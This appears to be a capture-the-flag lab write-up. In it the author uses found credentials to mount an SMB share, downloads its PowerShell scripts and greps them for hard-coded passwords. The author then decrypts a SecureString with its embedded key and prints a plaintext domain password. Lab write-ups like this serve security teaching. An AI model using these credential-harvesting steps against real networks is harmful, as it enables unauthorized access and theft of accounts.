# Yaaarrr! (Time to Plunder)

Now that I had a new set of credentials (`elf_svc:Snow2021!`), it was time to see what I could do with it. After some poking around, I discovered that with my new creds I can access the `//10.128.3.30/elfu_svc_shr` share via SMB! Opening it up with `smbclient`, I noticed that it contained a bunch of powershell files.

![SMB](/img/obj8-8/img1.png)

I downloaded them all to the local dir with:
`prompt off` -- To turn off the "Are you sure?" ptompt
`mget *.*` -- Download absolutely everything


Now that I had the files stored locally, I could simply `grep` through everything. This was useful because now I can look for any hard-coded passwords or anything similar.

Searching for "passw" gave me a bunch of things, but I wanted to narrow it down more.

`grep -i passw *`

Then I remembered, Storing a password in Powershell generally calls upon the usage of converting text to a `SecureString` with `ConvertTo-SecureString` so I searched for that:

`grep 'ConvertTo-SecureString' *`

And I got a bit less. Some interesting files I particularly liked was `Encryption.ps1` and `HelperFunctions.ps1`, but after manually looking through everyone I discovered an interesting file: `GetProcessInfo.ps1`:

```powershell
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
```

This simply invokes the `Get-Process` command on the `10.128.1.53` host. However the password apparently seems to be encrypted. I've seen this particular method performed before, and honestly I don't understand why it's even used since decrypting it is trivial. So trivial, I can show you right here. I'll simply write the following Powershell script:

```powershell
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
$aCred.GetNetworkCredential() | fl
```

With the above, I can run everything up to the `$aCred` line and then just print out the password!

![Printing the Creds](/img/obj8-8/img2.png)


Executing the above shows:

```text
UserName       : remote_elf
Password       : A1d655f7f5d98b10!
SecurePassword : System.Security.SecureString
Domain         : elfu.local
```

New credentials! What wonderous things will *you* unlock now?